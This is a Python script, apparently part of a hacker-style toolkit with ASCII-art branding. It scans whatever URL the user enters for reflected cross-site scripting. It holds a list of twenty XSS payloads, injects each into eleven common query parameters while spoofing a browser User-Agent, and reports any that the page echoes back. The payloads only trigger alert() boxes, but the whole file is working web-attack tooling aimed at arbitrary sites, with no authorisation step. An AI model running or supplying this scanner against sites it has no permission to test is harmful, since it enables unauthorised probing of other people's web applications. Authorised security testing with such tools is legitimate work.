import requests
from bs4 import BeautifulSoup
import os
import fade
import time

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<input type='text' value='<script>alert(1)</script>'>",
    "<body onload=alert('XSS')>",
    "<embed src='javascript:alert(1)'>",
    "<object data='javascript:alert(1)'></object>",
    "<meta http-equiv='x-dns-prefetch-control' content='onload=alert(1)'>",
    "<form action='javascript:alert(1)'></form>",
    "<details open ontoggle=alert(1)></details>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<script src='data:text/javascript,<script>alert(1)</script>'></script>",
    "<script>document.write('<script>alert(1)<\/script>')</script>",
    "<input type='text' value='<svg/onload=alert(1)>'>",
    "<style>body{background:url('javascript:alert(1)') !important;}</style>",
    "<script>eval('alert(1)')</script>",
    "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
    "<object data='data:text/html,<script>alert(1)</script>'></object>"
]

def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.003)
    print()
        
def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def print_ascii_art():
    art = """
▒██   ██▒  ██████   ██████     ██▒   █▓ █    ██  ██▓     ███▄    █ 
▒▒ █ █ ▒░▒██    ▒ ▒██    ▒    ▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █ 
░░  █   ░░ ▓██▄   ░ ▓██▄       ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒
 ░ █ █ ▒   ▒   ██▒  ▒   ██▒     ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒
▒██▒ ▒██▒▒██████▒▒▒██████▒▒      ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░
▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░      ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒ 
░░   ░▒ ░░ ░▒  ░ ░░ ░▒  ░ ░      ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░
 ░    ░  ░  ░  ░  ░  ░  ░          ░░   ░░░ ░ ░   ░ ░      ░   ░ ░ 
 ░    ░        ░        ░           ░     ░         ░  ░         ░ 
                                   ░                               
                    Made by Nkrz.dll
                            
    """
    art_faded = fade.water(art)
    Slow(art_faded)

def check_xss(url):
    Slow(f"\nTesting for XSS vulnerabilities on: {url}\n")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive'
    }
    
    for payload in payloads:
        for param in ['q', 'search', 'id', 'page', 'action', 'data', 'src', 'href', 'value', 'content', 'srcdoc']:
            test_url = f"{url}?{param}={payload}"
            Slow(f"Testing URL: {test_url}")

            try:
                response = requests.get(test_url, headers=headers)
                if payload in response.text:
                    Slow(f"Potential XSS vulnerability detected in URL: {test_url}")
                else:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if soup.find_all(text=lambda text: text and payload in text):
                        Slow(f"Potential XSS vulnerability detected in URL: {test_url}")
            except requests.RequestException as e:
                Slow(f"Request error: {e}")
            except Exception as e:
                Slow(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    clear()
    print_ascii_art()
    url = input(fade.water("Enter the URL for found XSS fail: "))
    check_xss(url)
    input("[x] Appuyer sur entrée pour retourner au menu principal.")
    os.system('python ../../main.py')
